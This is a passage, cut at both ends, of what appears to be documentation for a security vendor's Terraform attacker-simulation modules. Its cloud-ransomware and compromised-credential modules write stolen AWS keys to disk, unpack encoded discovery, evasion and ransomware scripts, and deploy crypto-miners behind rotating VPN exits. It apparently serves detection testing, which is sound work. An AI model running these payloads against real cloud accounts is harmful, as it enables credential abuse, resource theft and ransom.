&gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/evasion\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.cloudransom\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/cloudransom\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.cloudcrypto\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/main\.tf<br/>    echo &\#x27;$\{base64gzip\(local\.terraform\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/terraform\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.hostcrypto\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/main\.tf<br/>    echo &\#x27;$\{base64gzip\(local\.terraform\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/terraform\.sh<br/>    log &quot;Starting as background job\.\.\.&quot;<br/>    if \[ &quot;$\{var\.inputs\[&quot;protonvpn\_tier&quot;\]\}&quot; == &quot;0&quot; \]; then<br/>        for i in $\(echo &quot;US NL\-FREE\#1 JP\-FREE\#3 NL\-FREE\#4 NL\-FREE\#8 US\-FREE\#5 NL\-FREE\#9 NL\-FREE\#12 NL\-FREE\#13 NL\-FREE\#14 NL\-FREE\#15 NL\-FREE\#16 US\-FREE\#13 US\-FREE\#32 US\-FREE\#33 US\-FREE\#34 NL\-FREE\#39 NL\-FREE\#52 NL\-FREE\#57 NL\-FREE\#87 NL\-FREE\#133 NL\-FREE\#136 NL\-FREE\#148 US\-FREE\#52 US\-FREE\#53 US\-FREE\#54 US\-FREE\#51 NL\-FREE\#163 NL\-FREE\#164 US\-FREE\#58 US\-FREE\#57 US\-FREE\#56 US\-FREE\#55&quot;\); do cp \.env\-protonvpn \.env\-protonvpn\-$i; sed \-i &quot;s/RANDOM/$i/&quot; \.env\-protonvpn\-$i; done<br/>        /bin/bash auto\-free\.sh<br/>    else<br/>        for i in $\(echo &quot;AU CR IS JP LV NL NZ SG SK US&quot;\); do cp \.env\-protonvpn\-paid \.env\-protonvpn\-paid\-$i; sed \-i &quot;s/RANDOM/$i/&quot; \.env\-protonvpn\-paid\-$i; done<br/>        /bin/bash auto\-paid\.sh<br/>    fi;<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    protonvpn       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = var\.inputs\[&quot;protonvpn\_server&quot;\]<br/>                                    protonvpn\_tier = tostring\(var\.inputs\[&quot;protonvpn\_tier&quot;\]\)<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    protonvpn\-paid       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = var\.inputs\[&quot;protonvpn\_server&quot;\]<br/>                                    protonvpn\_tier = 2<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    protonvpn\-baseline  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = &quot;US&quot;<br/>                                    protonvpn\_tier = tostring\(var\.inputs\[&quot;protonvpn\_tier&quot;\]\)<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    auto\-free   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-free\.sh\.tpl&quot;,<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\[&quot;compromised\_keys\_user&quot;\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\[&quot;attack\_delay&quot;\]<br/>                                \}<br/>                            \)<br/>    auto\-paid   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-paid\.sh\.tpl&quot;,<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\[&quot;compromised\_keys\_user&quot;\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\[&quot;attack\_delay&quot;\]<br/>                                \}<br/>                            \)<br/>    baseline    = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/baseline\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    discovery   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/discovery\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    evasion     = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/evasion\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudransom = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudransom\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudcrypto = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto\.tf\.tpl&quot;,<br/>                                \{<br/>                                    name = &quot;crypto\-gpu\-miner\-$\{var\.inputs\[&quot;environment&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>                                    instances = 12<br/>                                    wallet = var\.inputs\[&quot;ethermine\_wallet&quot;\]<br/>                                    region = var\.inputs\[&quot;region&quot;\]<br/>                                \}<br/>                            \)<br/>    hostcrypto  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/hostcrypto\.tf\.tpl&quot;,<br/>                                \{<br/>                                    name = &quot;host\-cpu\-miner\-$\{var\.inputs\[&quot;environment&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>                                    region = var\.inputs\[&quot;region&quot;\]<br/>                                    instances = 1<br/>                                    minergate\_user = var\.inputs\[&quot;minergate\_user&quot;\]<br/>                                    nicehash\_user = var\.inputs\[&quot;nicehash\_user&quot;\]<br/>                                \}<br/>                            \)<br/>    <br/>    terraform  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/terraform\.sh\.tpl&quot;,<br/>                                \{<br/>                                \}<br/>                            \)<br/>    <br/>    start       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/start\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_auto\-free\.sh&quot;<br/>                content = base64encode\(local\.auto\-free\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_auto\-paid\.sh&quot;<br/>                content = base64encode\(local\.auto\-paid\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_baseline\.sh&quot;<br/>                content = base64encode\(local\.baseline\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_discovery\.sh&quot;<br/>                content = base64encode\(local\.discovery\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_evasion\.sh&quot;<br/>                content = base64encode\(local\.evasion\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_cloudransom\.sh&quot;<br/>                content = base64encode\(local\.cloudransom\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_terraform\.sh&quot;<br/>                content = base64encode\(local\.terraform\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_start\.sh&quot;<br/>                content = base64encode\(local\.start\)<br/>            \}<br/>        \]<br/>    \}<br/><br/><br/>\}</pre> |
| attacker-simulation-attacker-exec-docker-composite-cloud-ransomware        | ./modules/ssm/execute-docker-composite-cloud-ransomware        | ssm_exec_docker_cloud_ransomware           | context.aws.ssm.attacker.execute.docker_composite_cloud_ransomware        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_cloud_ransomware": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-cloud-ransomware        | <pre>locals \{<br/>    attack\_dir = &quot;/cloud\-tunnel&quot;<br/>    script = &quot;cloudransom\.sh&quot;<br/>    script\_type = &quot;aws\-cli&quot;<br/>    attack\_type = &quot;cloud\_ransomware&quot;<br/>    aws\_creds = join\(&quot;\\n&quot;, \[ for u,k in var\.inputs\[&quot;compromised\_credentials&quot;\]: &quot;echo &\#x27;$\{k\.rendered\}&\#x27; &gt; $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}&quot; \]\)<br/>    payload = &lt;&lt;\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\} $\{local\.attack\_dir\}/aws\-cli/scripts $\{local\.attack\_dir\}/terraform/scripts/cloudcrypto $\{local\.attack\_dir\}/terraform/scripts/hostcrypto $\{local\.attack\_dir\}/protonvpn<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    echo &\#x27;$\{base64gzip\(local\.start\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/start\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.auto\-free\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/auto\-free\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.auto\-paid\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/auto\-paid\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\-paid\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn\-paid<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\-baseline\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn\-baseline<br/>    echo &\#x27;$\{base64gzip\(local\.baseline\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/baseline\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.discovery\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/discovery\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.evasion\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/evasion\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.cloudransom\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/cloudransom\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.cloudcrypto\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/main\.tf<br/>    echo &\#x27;$\{base64gzip\(local\.terraform\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/terraform\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.hostcrypto\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/main\.tf<br/>    echo &\#x27;$\{base64gzip\(local\.terraform\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/terraform\.sh<br/>    log &quot;Starting as background job\.\.\.&quot;<br/>    if \[ &quot;$\{var\.inputs\[&quot;protonvpn\_tier&quot;\]\}&quot; == &quot;0&quot; \]; then<br/>        for i in $\(echo &quot;US NL\-FREE\#1 JP\-FREE\#3 NL\-FREE\#4 NL\-FREE\#8 US\-FREE\#5 NL\-FREE\#9 NL\-FREE\#12 NL\-FREE\#13 NL\-FREE\#14 NL\-FREE\#15 NL\-FREE\#16 US\-FREE\#13 US\-FREE\#32 US\-FREE\#33 US\-FREE\#34 NL\-FREE\#39 NL\-FREE\#52 NL\-FREE\#57 NL\-FREE\#87 NL\-FREE\#133 NL\-FREE\#136 NL\-FREE\#148 US\-FREE\#52 US\-FREE\#53 US\-FREE\#54 US\-FREE\#51 NL\-FREE\#163 NL\-FREE\#164 US\-FREE\#58 US\-FREE\#57 US\-FREE\#56 US\-FREE\#55&quot;\); do cp \.env\-protonvpn \.env\-protonvpn\-$i; sed \-i &quot;s/RANDOM/$i/&quot; \.env\-protonvpn\-$i; done<br/>        /bin/bash auto\-free\.sh<br/>    else<br/>        for i in $\(echo &quot;AU CR IS JP LV NL NZ SG SK US&quot;\); do cp \.env\-protonvpn\-paid \.env\-protonvpn\-paid\-$i; sed \-i &quot;s/RANDOM/$i/&quot; \.env\-protonvpn\-paid\-$i; done<br/>        /bin/bash auto\-paid\.sh<br/>    fi;<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    protonvpn       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = var\.inputs\[&quot;protonvpn\_server&quot;\]<br/>                                    protonvpn\_tier = tostring\(var\.inputs\[&quot;protonvpn\_tier&quot;\]\)<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    protonvpn\-paid       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = var\.inputs\[&quot;protonvpn\_server&quot;\]<br/>                                    protonvpn\_tier = 2<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    protonvpn\-baseline  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = &quot;US&quot;<br/>                                    protonvpn\_tier = tostring\(var\.inputs\[&quot;protonvpn\_tier&quot;\]\)<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    auto\-free   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-free\.sh\.tpl&quot;,<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\[&quot;compromised\_keys\_user&quot;\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\[&quot;attack\_delay&quot;\]<br/>                                \}<br/>                            \)<br/>    auto\-paid   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-paid\.sh\.tpl&quot;,<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\[&quot;compromised\_keys\_user&quot;\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\[&quot;attack\_delay&quot;\]<br/>                                \}<br/>                            \)<br/>    baseline    = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/baseline\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    discovery   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/discovery\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    evasion     = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/evasion\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudransom = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudransom\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudcrypto = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto\.tf\.tpl&quot;,<br/>                                \{<br/>                                    name = &quot;crypto\-gpu\-miner\-$\{var\.inputs\[&quot;environment&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>                                    instances = 12<br/>                                    wallet = var\.inputs\[&quot;ethermine\_wallet&quot;\]<br/>                                    region = var\.inputs\[&quot;region&quot;\]<br/>                                \}<br/>                            \)<br/>    hostcrypto  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/hostcrypto\.tf\.tpl&quot;,<br/>                                \{<br/>                                    name = &quot;host\-cpu\-miner\-$\{var\.inputs\[&quot;environment&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>                                    region = var\.inputs\[&quot;region&quot;\]<br/>                                    instances = 1<br/>                                    minergate\_user = var\.inputs\[&quot;minergate\_user&quot;\]<br/>                                    nicehash\_user = var\.inputs\[&quot;nicehash\_user&quot;\]<br/>                                \}<br/>                            \)<br/>    <br/>    terraform  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/terraform\.sh\.tpl&quot;,<br/>                                \{<br/>                                \}<br/>                            \)<br/>    <br/>    start       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/start\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_auto\-free\.sh&quot;<br/>                content = base64encode\(local\.auto\-free\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_auto\-paid\.sh&quot;<br/>                content = base64encode\(local\.auto\-paid\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_baseline\.sh&quot;<br/>                content = base64encode\(local\.baseline\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_discovery\.sh&quot;<br/>                content = base64encode\(local\.discovery\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_evasion\.sh&quot;<br/>                content = base64encode\(local\.evasion\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_cloudransom\.sh&quot;<br/>                content = base64encode\(local\.cloudransom\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_terraform\.sh&quot;<br/>                content = base64encode\(local\.terraform\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_start\.sh&quot;<br/>                content = base64encode\(local\.start\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre>          |
| attacker-simulation-attacker-exec-docker-composite-compromised-credentials | ./modules/ssm/execute-docker-composite-compromised-credentials | ssm_exec_docker_compromised_keys           | context.aws.ssm.attacker.execute.docker_composite_compromised_credentials | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_compromised_credentials": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-compromised-credentials | <pre>locals \{<br/>    attack\_dir = &quot;/cloud\-tunnel&quot;<br/>    script = &quot;discovery\.sh&quot;<br/>    script\_type = &quot;scoutsuite&quot;<br/>    attack\_type = &quot;compromised\_keys&quot;<br/>    aws\_creds = join\(&quot;\\n&quot;, \[ for u,k in var\.inputs\[&quot;compromised\_credentials&quot;\]: &quot;echo &\#x27;$\{k\.rendered\}&\#x27; &gt; $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}&quot; \]\)<br/>    payload = &lt;&lt;\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\} $\{local\.attack\_dir\}/aws\-cli/scripts $\{local\.attack\_dir\}/terraform/scripts/cloudcrypto $\{local\.attack\_dir\}/terraform/scripts/hostcrypto $\{local\.attack\_dir\}/protonvpn<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    echo &\#x27;$\{base64gzip\(local\.start\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/start\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.auto\-free\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/auto\-free\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.auto\-paid\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/auto\-paid\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\-paid\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn\-paid<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\-baseline\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn\-baseline<br/>    echo &\#x27;$\{base64gzip\(local\.baseline\)\}&\#x27; \| base64 \-d 